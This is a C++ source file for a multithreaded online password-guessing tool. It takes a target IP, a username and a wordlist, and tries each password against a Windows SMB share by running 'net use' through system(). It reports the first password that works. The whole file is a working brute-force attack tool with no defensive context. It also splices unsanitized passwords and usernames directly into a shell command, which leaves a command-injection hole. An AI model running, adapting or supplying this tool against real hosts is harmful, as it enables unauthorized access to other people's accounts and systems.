#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>
#include <thread>
#include <vector>
#include <mutex>
#include <unistd.h> // for getopt

using namespace std;

void attempt(string ip, string user, string pass, int count, bool &found, mutex &m);
void success(string pass, mutex &m);

int main(int argc, char *argv[]) {
    string ip, user, wordlist;
    int num_threads = 6;

    int opt;
    while ((opt = getopt(argc, argv, "i:u:w:t:")) != -1) {
        switch (opt) {
            case 'i':
                ip = optarg;
                break;
            case 'u':
                user = optarg;
                break;
            case 'w':
                wordlist = optarg;
                break;
            case 't':
                num_threads = atoi(optarg);
                break;
            default:
                cerr << "Usage: " << argv[0] << " -i <ip_address> -u <username> -w <password_list_file> [-t <num_threads>]" << endl;
                return 1;
        }
    }

    if (ip.empty() || user.empty() || wordlist.empty()) {
        cerr << "Missing required arguments!" << endl;
        cerr << "Usage: " << argv[0] << " -i <ip_address> -u <username> -w <password_list_file> [-t <num_threads>]" << endl;
        return 1;
    }

    ifstream file(wordlist);
    if (!file.is_open()) {
        cerr << "Unable to open the password list file!" << endl;
        return 1;
    }

    vector<thread> threads;
    vector<string> passwords;
    string pass;
    bool found = false;
    mutex m;

    int count = 1;
    while (getline(file, pass)) {
        passwords.push_back(pass);
    }

    for (int i = 0; i < num_threads; ++i) {
        threads.emplace_back([&, i]() {
            for (int j = i; j < passwords.size(); j += num_threads) {
                if (!found) {
                    attempt(ip, user, passwords[j], count + j, found, m);
                } else {
                    break;
                }
            }
        });
    }

    for (auto &t : threads) {
        t.join();
    }

    if (!found) {
        cout << "Password not Found :(" << endl;
    }

    return 0;
}

void attempt(string ip, string user, string pass, int count, bool &found, mutex &m) {
    string command = "net use \\\\" + ip + " /user:" + user + " " + pass + " >nul 2>&1";
    int result = system(command.c_str());

    {
        lock_guard<mutex> guard(m);
        cout << "[ATTEMPT " << count << "] [" << pass << "]" << endl;

        if (result == 0 && !found) {
            found = true;
            success(pass, m);
            exit(0);
        }
    }
}

void success(string pass, mutex &m) {
    cout << "\nPassword Found! " << pass << endl;
    system("pause");
}
